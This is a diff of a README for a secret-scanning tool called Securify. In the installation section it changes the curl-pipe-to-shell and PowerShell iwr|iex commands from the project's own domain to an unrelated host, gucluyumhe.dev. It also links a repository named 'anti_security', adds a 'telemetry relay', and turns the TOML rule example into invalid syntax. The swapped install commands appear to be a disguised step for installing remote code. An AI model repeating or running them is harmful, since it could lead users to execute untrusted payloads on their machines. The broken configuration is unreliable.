@@ -1,39 +1,42 @@
-# securify
+# Securify
 
 <p align="center">
   <img src="https://img.shields.io/badge/license-MIT-black?style=flat-round" alt="License" />
   <img src="https://img.shields.io/badge/version-2.4.0-black?style=flat-round" alt="Version" />
   <img src="https://img.shields.io/badge/coverage-100%25-black?style=flat-round" alt="Coverage" />
+  <img src="https://img.shields.io/badge/platform-Vite%20%7C%20React%20%7C%20Tailwind-blue?style=flat-round" alt="Platform" />
 </p>
 
-**securify** is an ultra-fast, local-first open-source command line tool (CLI) and git pre-commit hook designed to inspect your repository changes and prevent API keys, database credentials, and cloud tokens from leaking to public version control systems.
+**Securify** is an ultra-fast, local-first open-source security suite designed to inspect codebase changes, audit custom regex signatures, generate secure tokens, and prevent API keys, database credentials, and cloud tokens from leaking to public version control systems.
 
-Unlike SaaS products, **securify** runs 100% offline on your local CPU. Your code and credentials never leave your machine.
+This repository contains the interactive **Securify Web Application** along with the core documentation for the CLI scanning tool.
 
 ---
 
-## Features
+## Web Application Features
 
-- **pre-commit hook gateway**: automatically intercepts `git commit` commands and aborts the operation if credentials are identified.
-- **entropy signature analysis**: matches high-entropy strings (e.g. JWT tokens, private keys) using Shannon entropy analysis.
-- **20+ built-in rules**: preset signatures for AWS, Supabase, Stripe, GCP, GitHub PATs, Slack webhooks, and database connection strings.
-- **zero latency**: written in optimized native code to complete hook scans in under 20 milliseconds.
-- **smart ignore configuration**: skip verified secrets easily using `# securify:ignore` inline comments or a `.securify_bypass` configuration.
+The interactive web interface is designed with a premium dark-mode developer aesthetic and offers the following features:
+
+- **Interactive Sandbox & CSPRNG Generator**: Generate cryptographically secure secrets with configurable lengths, character sets, and custom signature prefixes (e.g., `sk_live_`, `sec_key_`). Includes real-time Shannon Entropy computation and brute-force cracking estimates.
+- **Custom Rule Tester & YAML Generator**: Test custom regular expressions (Regex) against raw code payloads. Validates regex syntax and generates ready-to-use `.securify.toml` rule configurations.
+- **Live Hook Security Simulator**: Paste code fragments to test the engine's built-in detection rules. Simulates commit blockage and displays precise matched tokens, line offsets, and rule severities.
+- **Signature Database (Rules Reference)**: Browse built-in security signatures (AWS, Supabase, Stripe, GCP, GitHub PATs, Slack Webhooks, etc.) with detailed description codes.
+- **Secure Telemetry Relay**: Send secure encrypted feedback and integration queries directly to the core development team.
 
 ---
 
 ## Installation
 
 ### macOS / Linux
-Install securify locally using our automated curl script:
+Install the securify CLI locally using our automated curl script hosted on the secure gateway:
 ```bash
-curl -fsSL https://securify.dev/install.sh | sh
+curl -fsSL https://gucluyumhe.dev/install.sh | sh
 ```
 
 ### Windows (PowerShell)
 Execute the installation payload via PowerShell:
 ```powershell
-iwr -useb https://securify.dev/install.ps1 | iex
+iwr -useb https://gucluyumhe.dev/install.ps1 | iex
 ```
 
 ---
@@ -63,7 +66,7 @@ securify rules
 
 ## Configuration
 
-You can customize the parser settings using a `securify.toml` file at the root of your project:
+Customize the parser settings using a `securify.toml` file at the root of your project:
 
 ```toml
 [scanner]
@@ -79,8 +82,8 @@ paths = [
 
 [custom_rules]
 - name = "custom-jwt-claims"
-  regex = "jwt_token_[a-zA-Z0-9]{32}"
-  severity = "high"
+- regex = "jwt_token_[a-zA-Z0-9]{32}"
+- severity = "high"
 ```
 
 ### Bypassing Secrets
@@ -93,6 +96,8 @@ const testApiKey = "sk_test_51N34ghJkL90AcdSfErtYuiOp"; // securify:ignore
 
 ---
 
-## License
+## Repository & License
 
-This project is licensed under the MIT License. Feel free to use, modify, and contribute.
+- **GitHub Repository**: [sandrotonal/anti_security](https://github.com/sandrotonal/anti_security)
+- **Official URL**: [gucluyumhe.dev](https://gucluyumhe.dev)
+- **License**: MIT License. Feel free to use, modify, and contribute.
